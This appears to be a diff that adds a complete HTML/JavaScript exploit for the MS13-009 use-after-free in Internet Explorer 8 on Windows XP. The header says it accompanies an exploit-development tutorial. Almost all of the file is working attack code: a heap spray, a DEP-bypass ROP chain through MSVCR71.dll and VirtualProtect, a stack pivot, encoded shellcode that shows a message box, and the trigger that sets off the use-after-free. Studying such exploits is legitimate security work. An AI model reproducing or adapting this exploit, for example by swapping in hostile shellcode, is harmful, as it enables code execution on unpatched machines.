@@ -1,0 +1,121 @@
+<!-----------------------------------------------------------------------------
+// Exploit: MS13-009 Use-After-Free IE8 (DEP)                                //
+// Author: b33f - http://www.fuzzysecurity.com/                              //
+// OS: Tested on XP PRO SP3                                                  //
+// Browser: Internet Explorer 8.00.6001.18702                                //
+//---------------------------------------------------------------------------//
+// This exploit was created for Part 9 of my Exploit Development tutorial    //
+// series => http://www.fuzzysecurity.com/tutorials/expDev/11.html           //
+------------------------------------------------------------------------------>
+ 
+<!doctype html>
+<html>
+<head>
+<script>
+ 
+    //Fix BSTR spec
+    function alloc(bytes, mystr) {
+        while (mystr.length<bytes) mystr += mystr;
+        return mystr.substr(0, (bytes-6)/2);
+    }
+     
+    block_size = 0x1000;
+    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
+    Padding = '';
+    NopSlide = '';
+     
+    var Shellcode = unescape(
+     
+    //--------------------------------------------------------[ROP]-//
+    // Generic ROP-chain based on MSVCR71.dll
+    //--------------------------------------------------------------//
+    "%u653d%u7c37" + // 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
+    "%ufdff%uffff" + // 0xfffffdff : Value to negate, will become 0x00000201 (dwSize)
+    "%u7f98%u7c34" + // 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]
+    "%u15a2%u7c34" + // 0x7c3415a2 : JMP [EAX] [msvcr71.dll]
+    "%uffff%uffff" + // 0xffffffff : 
+    "%u6402%u7c37" + // 0x7c376402 : skip 4 bytes [msvcr71.dll]
+    "%u1e05%u7c35" + // 0x7c351e05 : NEG EAX # RETN [msvcr71.dll] 
+    "%u5255%u7c34" + // 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll] 
+    "%u2174%u7c35" + // 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 
+    "%u4f87%u7c34" + // 0x7c344f87 : POP EDX # RETN [msvcr71.dll] 
+    "%uffc0%uffff" + // 0xffffffc0 : Value to negate, will become 0x00000040
+    "%u1eb1%u7c35" + // 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll] 
+    "%ud201%u7c34" + // 0x7c34d201 : POP ECX # RETN [msvcr71.dll] 
+    "%ub001%u7c38" + // 0x7c38b001 : &Writable location [msvcr71.dll]
+    "%u7f97%u7c34" + // 0x7c347f97 : POP EAX # RETN [msvcr71.dll] 
+    "%ua151%u7c37" + // 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
+    "%u8c81%u7c37" + // 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 
+    "%u5c30%u7c34" + // 0x7c345c30 : ptr to "push esp #  ret " [msvcr71.dll]
+     
+    //-------------------------------------------------[ROP Epilog]-//
+    // After calling VirtalProtect() we are left with some junk.
+    //--------------------------------------------------------------//
+    "%u4141%u4141" +
+    "%u4141%u4141" +
+    "%u4141%u4141" +
+    "%u4141%u4141" +
+    "%u4141%u4141" + // Junk
+    "%u4141%u4141" +
+    "%u4141%u4141" +
+    "%u4141%u4141" +
+    "%u4141%u4141" +
+    "%u4141%u04eb" + // 0xeb04 short jump to get over what used to be EIP
+     
+    //-------------------------------------------[EIP - Stackpivot]-//
+    // EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
+    //--------------------------------------------------------------//
+    "%u8b05%u7c34" + // 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
+     
+    //--------------------------------------------------[shellcode]-//
+    // js Little Endian Messagebox => "Bang, bang!"
+    //--------------------------------------------------------------//
+    "%ud1bb%u6f46%ud9e9%ud9c7%u2474%u5af4%uc931%u40b1%uc283%u3104%u115a%u5a03%ue211" +
+    "%u9f24%u7284%u541f%u717f%u47ae%u0ecd%uaee1%u7a56%u0170%u0a1c%uea7e%uef54%uaaf5" +
+    "%u8490%u1377%uac2a%u1cbf%ua434%ufb4c%u9745%u1d4d%u9c25%ufadd%u2982%u3f58%u7940" +
+    "%u474a%u6857%ufd01%ue74f%u224f%u1c71%u168c%u6938%udc66%u83bb%u1db7%u9b8a%u4d4b" +
+    "%udb69%u89c7%u13b3%u972a%u47f4%uacc0%ub386%ua600%u3797%u6c0a%ua359%ue7cc%u7855" +
+    "%ua29b%u7f79%ud970%uf486%u3687%u4e0f%udaa3%u8c71%uea19%uc658%u0ed4%u2413%u5e8e" +
+    "%ua76a%u0da2%u289b%u4dc5%udea4%ub67c%u9fe0%u54a6%ue765%ubd4a%u0fd8%u42fc%u3023" +
+    "%uf889%ua7d4%u6ee5%u76c5%u5d9d%u5737%uca39%ud442%u78a4%u4625%u7702%u91bc%u781c" +
+    "%u59eb%u4429%ud944%ueb81%ua128%uf756%u8b96%u69b0%ud428%u02bf%u0b8e%uf31f%u2e46" +
+    "%uc06c%u9ff0%uae49%ufba1%u2669%u6cba%u5f1f%u351c%ub3b7%ua77e%ua426%u463c%u53c6" +
+    "%u41f0%ud09e%u5ad6%u0917%u8f27%u9975%u7d19%ucd86%u41ab%u1128%u499e");
+     
+    for (p = 0; p < padding_size; p++){ 
+    Padding += unescape('%ub33f');}
+     
+    for (c = 0; c < block_size; c++){ 
+    NopSlide += unescape('%u9090');}
+    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
+     
+    var OBJECT = Padding + Shellcode + NopSlide;
+    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
+     
+    var evil = new Array();
+    for (var k = 0; k < 150; k++) {
+        evil[k] = OBJECT.substr(0, OBJECT.length);
+    }
+  
+    var data;
+    var objArray = new Array(1150);
+   
+    setTimeout(function(){
+    document.body.style.whiteSpace = "pre-line";
+   
+    //CollectGarbage();
+   
+        for (var i=0;i<1150;i++){
+            objArray[i] = document.createElement('div');
+            objArray[i].className = data += unescape("%u0c0c%u0c0c");
+        }
+   
+        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
+        }, 100)
+   
+</script>
+</head>
+<body>
+<p> </p>
+</body>
+</html>
